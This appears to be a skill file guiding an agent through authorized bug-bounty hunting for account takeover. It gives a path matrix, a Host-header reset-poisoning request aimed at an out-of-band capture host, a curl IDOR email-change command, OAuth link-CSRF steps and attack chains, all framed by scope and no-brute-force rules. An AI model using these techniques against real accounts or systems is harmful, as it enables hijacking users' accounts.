---
name: hunt-ato
description: "Hunt account takeover taxonomy — distinct paths to ATO, plus chains. Paths: (1) password reset / magic-link / passwordless flaws (host-header token redirect, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email or phone change without re-auth, (3) OAuth account-link CSRF and nOAuth IdP auto-link on unverified email, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, known-default HMAC only — no cracking, kid injection), (7) password or passkey/WebAuthn change without step-up, (8) social-recovery / security-question disclosure or missing rate-limit (no wordlist), (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft. Validate: real takeover of test account B from attacker A's session; OOB for blind token-leak. Use when hunting ATO chains, password reset / email change / MFA / OAuth / session / JWT / passkeys."
---

# HUNT-ATO — Account Takeover Taxonomy

ATO is a **destination**, not a single bug. A path is Critical only when you take over **test account B** from attacker **A** (different session/IP/device). Self-lockout, or a flow that already requires B’s password **and** B’s session, is not standalone ATO.

## Rails
- In-scope only. Own **two** test accounts (A attacker, B victim). Never a real third-party inbox.
- **No keyspace exhaustion / stuffing / hashcat.** Predictable-token claims use entropy measurement + reachability math, not 10^6 guesses. Known-default JWT secrets only (`hunt-jwt`).
- Prove takeover **once** on B, then stop. No mass-reset.
- STOP at draft. Claim only the chain you reproduced end-to-end.

## Decision tree
Walk **every** identity-mutation surface the app exposes. Do not stop after one failed reset:

1. Map: register, login, logout, forgot/reset, email change, password change, MFA, OAuth/SAML link, recovery questions, API tokens, backup email, passkeys.
2. For each path below: can A reach a **session as B** or **credentials of B** without B’s current password?
3. If a primitive needs a stolen cookie, you **must** show an in-scope way to get it (`hunt-xss`, CSWSH, fixation, Referer leak) or drop severity (`triage-rtfs`).
4. Confirm with a **fresh browser** login as B using the new factor (password / IdP / email).

## Path matrix

| # | Path | Probe | Confirm |
|---|---|---|---|
| 1 | **Reset / magic-link poisoning (Host)** | `POST /forgot-password` **or the passwordless/magic-link send endpoint** with `Host` / `X-Forwarded-Host` / `X-Host` / `X-Forwarded-Server` / dual-Host pointing at **unique OOB**. Email of **B** (inbox you own). | Read the **actual email**. Link host must be OOB (not just reflected in a 200). Token hits Collaborator when clicked, then exchanges. `hunt-host-header`. |
| 2 | **Reset token leak** | Reset page loads third-party script/img; token in query. Open-redirect on reset URL. Token in JSON response / HTML comment / `GET /reset?email=`. | Outbound Referer or response **contains the token**. Exchange it. `Referrer-Policy: no-referrer` + POST-body tokens mitigate — note absence. |
| 3 | **Token entropy / binding** | Collect **your** B tokens (≤20). Measure structure (6-digit, `md5(ts)`, sequential). Cross: B’s token + A’s email/userid. Reuse after consume; still valid after 2h; token#1 valid after token#2 issued. | Guessability = math + structure, **not** a million-guess run. Cross-account swap = IDOR-in-reset (`hunt-idor`). |
| 4 | **Email or phone change w/o re-auth** | `PUT /api/user/email` or the phone/factor endpoint, as A against **B’s id** (IDOR) or as B’s session without current password/OTP. Skip confirm-link to the **old** factor. | B’s email or phone now A-controlled → reset or OTP lands at A → login as B. |
| 5 | **OAuth/SAML account-link CSRF** | Attacker starts IdP login, sends callback `code`/`SAMLResponse` to logged-in B. Missing `state` / `RelayState` binding. | B’s account linked to A’s IdP → A logs in via SSO as B. `hunt-oauth`, `hunt-saml`, `hunt-csrf`. |
| 5b | **IdP auto-link (nOAuth)** | A’s IdP account has `email` = B’s address and `email_verified` false/absent. App auto-links on email match. | Clean browser “Login with IdP” as A lands on **B**. Verified-email-only apps are closed — say so after one miss. `hunt-oauth`. |
| 6 | **MFA skip** | See `hunt-mfa-bypass`. | Post-MFA session without a valid factor. |
| 7 | **Session fixation** | Plant session id, B logs in, A rides it. `hunt-session`. | A’s pre-auth cookie becomes B’s authenticated session. |
| 8 | **JWT forge** | alg:none, RS256→HS256, leaked secret, `kid`/`jku`. `hunt-jwt`. **No cracking.** | Forged token performs an action **as B**. |
| 9 | **Password change w/o step-up** | `POST /password` with B’s stolen session, **no** `current_password` / MFA. | Login with new password from a clean browser. Then call `/me` with the **pre-change** refresh token or a second session. Survival means the takeover outlives B’s password change. Cookie-theft entry must be in-scope or severity drops. |
| 10 | **IdP redirect_uri / subdomain** | `redirect_uri` accepts `*.target.com`; dangling CNAME you can claim. `hunt-oauth` + `hunt-subdomain`. | Auth `code`/`token` **arrives** at your host (OOB log) and exchanges. |
| 11 | **Pre-account takeover** | Register B’s email before B does; or change unverified email to B’s; password-reset before verification. | When B later “signs up” / verifies, A already holds the session or reset path. |
| 12 | **Recovery answers** | If questions are **in-page / returned by `/api/me`**, use them. If OSINT-able, one correct answer on **your** B. **Do not** wordlist-brute. Prove missing rate limit with a small burst (`hunt-brute-force`). | Full recovery → session as B. |
| 13 | **Passkey / WebAuthn enroll** | With B’s session, complete register-options + register-verify (`/webauthn`, `/passkeys`, or the app’s names) **without** password or MFA. Also try an `rpId` / related-origin the app did not intend (parent domain). | A clean browser logs in as B using A’s authenticator on the **production** host. A ceremony that demands step-up and enforces it is closed. |
| 14 | **Email normalization collision** | Signup stores the address one way, reset/login looks it up another: case (`Victim@` vs `victim@`), Unicode NFKC fold (dotless `ı`, fullwidth), dot/`+tag` stripping, trailing whitespace. Register or change **your** account to a variant of B’s address that the app treats as distinct at signup but equal at reset (mailbox you control). | Request B’s reset; the token lands on **A’s** account or A’s variant mailbox → session as B. One variant, one proof. If both flows normalize identically, it is closed — say so after one miss. |

### Host-header reset
```http
POST /forgot-password HTTP/1.1
Host: UNIQUE.oastify.com
X-Forwarded-Host: UNIQUE.oastify.com
X-Host: UNIQUE.oastify.com

email=victimB@your-inbox.test
```
**FP:** many apps echo the header in HTML/email body but the `<a href>` stays on the real domain. **Read the email.**

### Email change → reset
```bash
# IDOR variant (A's session, B's id)
curl -s -X PATCH "https://$TARGET/api/users/$B_ID" -H "Cookie: $A_SESS" \
  -H 'Content-Type: application/json' -d '{"email":"attacker@inbox.test"}'
# Then forgot-password on B; reset link in attacker's inbox
```

### OAuth link CSRF (login CSRF / account bind)
```
1. A starts Google/Facebook login, captures callback URL with code (do not exchange)
2. B is logged into target
3. B visits https://target/oauth/callback?code=A_CODE&state=
4. Target binds A's IdP to B's account → A "Login with Google" → B
```

## Severity gate
- **Critical** — no/low B interaction: Host-header reset, JWT as B, IDOR email-change → reset, nOAuth auto-link, claimed `redirect_uri` code theft.
- **High** — one click **or** in-scope cookie theft + no-step-up password change.
- **Medium** — phishing + logged-in click (OAuth-link CSRF).
- **Low** — MitM-only, or self-account only.
- **Not ATO** — you already had B’s password and session; or token never left the pinned domain.

## Validation
- Two accounts, fresh browser: A takes B, then logs in as B.
- Blind steps (Host/Referer/`redirect_uri`) = **OOB** (unique hostname + inbox you control).
- Body-diff identity marker (`email`, `user_id`) before vs after.
- JSON-parse OAuth errors — do not substring-match `access_token` inside `AADSTS` claims.
- `triage-rtfs`: if impact starts from “once I have B’s cookie”, show how you get it in-scope.

## Chains (highest yield)
| Entry | Multiplier | Result |
|---|---|---|
| IDOR `PATCH /users/{id}` email | Forgot-password | Zero-click ATO |
| XSS / CSWSH / fixation | Password change or passkey enroll w/o step-up | Persistent ATO; passkey survives B's password change |
| Unverified IdP `email` claim | Auto-link on match | nOAuth ATO |
| Open redirect on trusted host | OAuth `redirect_uri` | Code theft (`hunt-oauth`) |
| Dangling `*.target.com` | OAuth whitelist | Code lands on claimed host |
| MFA skip | Any session as B | 2FA worthless |
| SAML XSW NameID | SP session / OAuth token | Admin ATO (`hunt-saml`) |

Cross-refs: `hunt-idor`, `hunt-mfa-bypass`, `hunt-oauth`, `hunt-saml`, `hunt-jwt`, `hunt-session`, `hunt-host-header`, `hunt-csrf`, `hunt-subdomain`, `offensive-osint`, `triage-validation`, `triage-rtfs`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
